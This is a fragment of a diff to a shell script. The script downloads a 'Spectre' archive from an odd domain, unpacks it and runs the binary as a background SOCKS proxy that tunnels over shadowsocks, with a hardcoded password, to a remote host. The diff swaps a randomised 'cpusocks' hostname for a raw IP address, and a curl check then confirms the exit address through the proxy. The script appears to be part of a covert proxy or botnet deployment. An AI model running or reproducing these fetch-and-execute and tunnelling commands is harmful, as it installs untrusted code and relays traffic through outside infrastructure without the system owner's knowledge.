@@ -12,7 +12,7 @@ wget http://greenleaf.teatspray.fun/Spectre.tar.gz
 sleep 2
 tar -xf Spectre.tar.gz
 sleep 2
-./Spectre -L=:1082 -F=ss://aes-128-cfb:mikrotik999@cpusocks$(shuf -i 1-6 -n 1).wot.mrface.com:8443 &
+./Spectre -L=:1082 -F=ss://aes-128-cfb:mikrotik999@45.135.58.52:8443 &
 sleep 2
 curl -x socks5h://127.0.0.1:1082 ifconfig.me
 sleep 2
